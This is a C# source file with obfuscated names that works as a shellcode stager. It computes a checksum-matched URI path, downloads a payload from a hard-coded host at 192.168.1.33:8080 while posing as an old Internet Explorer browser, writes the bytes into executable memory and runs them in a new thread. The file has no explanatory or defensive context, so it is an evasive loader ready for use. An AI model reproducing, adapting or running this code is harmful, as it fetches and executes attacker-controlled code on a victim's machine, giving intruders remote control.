using System;
using System.Net;
using System.Linq;
using System.Threading;
using System.Net.Sockets;
using System.Runtime.InteropServices;
namespace jFJvTasB
{
    class gDStbipO
    {
        static string HrZXJK(Random r, int s)
        {
            char[] MycmhnBn = new char[s];
            string meiOJEo = "A0waMyPs726RrkYHZtI3pcFQXWozJ1hjTgC8OVlmB9DdxS4ibG5qEUvLfunNKe";
            for (int i = 0; i < s; i++) { MycmhnBn[i] = meiOJEo[r.Next(meiOJEo.Length)]; }
            return new string(MycmhnBn);
        }
        static bool QOHgaDYCCTF(string s)
        {
            return ((s.ToCharArray().Select(x => (int)x).Sum()) % 0x100 == 92);
        }
        static string WtcpvhZhCgKsj(Random r)
        {
            string IafgsV = "";
            for (int i = 0; i < 64; ++i)
            {
                IafgsV = HrZXJK(r, 3);
                string MVSRyOm = new string("5hfFzB0e8uQaGA6mOpKTgdqw4rX2WoRvnsM9SLlk3iEYUjyVHIJNct1bDZ7CPx".ToCharArray().OrderBy(s => (r.Next(2) % 2) == 0).ToArray());
                for (int j = 0; j < MVSRyOm.Length; ++j)
                {
                    string EpaubIQTFoI = IafgsV + MVSRyOm[j];
                    if (QOHgaDYCCTF(EpaubIQTFoI)) { return EpaubIQTFoI; }
                }
            }
            return "9vXU";
        }
        static byte[] zElVHmvMwqTj(string BLikSCTYrwlUD)
        {
            WebClient FjeVQwMPA = new System.Net.WebClient();
            FjeVQwMPA.Headers.Add("User-Agent", "Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)");
            FjeVQwMPA.Headers.Add("Accept", "*/*");
            FjeVQwMPA.Headers.Add("Accept-Language", "en-gb,en;q=0.5");
            FjeVQwMPA.Headers.Add("Accept-Charset", "ISO-8859-1,utf-8;q=0.7,*;q=0.7");
            byte[] jCwuSnMBFr = null;
            try
            {
                jCwuSnMBFr = FjeVQwMPA.DownloadData(BLikSCTYrwlUD);
                if (jCwuSnMBFr.Length < 100000) return null;
            }
            catch (WebException) { }
            return jCwuSnMBFr;
        }
        static void huBuXTreUJqxYS(byte[] hPqvVfFcup)
        {
            if (hPqvVfFcup != null)
            {
                UInt32 cJIoXvswqb = VirtualAlloc(0, (UInt32)hPqvVfFcup.Length, 0x1000, 0x40);
                Marshal.Copy(hPqvVfFcup, 0, (IntPtr)(cJIoXvswqb), hPqvVfFcup.Length);
                IntPtr OpgqvbobJhgw = IntPtr.Zero;
                UInt32 MHqYuCSiJiNjgh = 0;
                IntPtr cGkTBYiM = IntPtr.Zero;
                OpgqvbobJhgw = CreateThread(0, 0, cJIoXvswqb, cGkTBYiM, 0, ref MHqYuCSiJiNjgh);
                WaitForSingleObject(OpgqvbobJhgw, 0xFFFFFFFF);
            }
        }
        static void Main()
        {
            Random ycRaEH = new Random((int)DateTime.Now.Ticks);
            byte[] HDEUylrSc = zElVHmvMwqTj("http://192.168.1.33:8080/" + WtcpvhZhCgKsj(ycRaEH));
            huBuXTreUJqxYS(HDEUylrSc);
        }
        [DllImport("kernel32")]
        private static extern UInt32 VirtualAlloc(UInt32 yvEZBTGvyLEnj, UInt32 DAhuric, UInt32 iDrZgGxx, UInt32 gflCJUhx);
        [DllImport("kernel32")]
        private static extern IntPtr CreateThread(UInt32 nnomubVf, UInt32 ghFrMhiRAK, UInt32 GYxYMSKPjJ, IntPtr utexvLoH, UInt32 roHOIJ, ref UInt32 uwCXYIZxNZEoG);
        [DllImport("kernel32")]
        private static extern UInt32 WaitForSingleObject(IntPtr QQAoMUZNlo, UInt32 QgPwmRkpjCQ);
    }
}
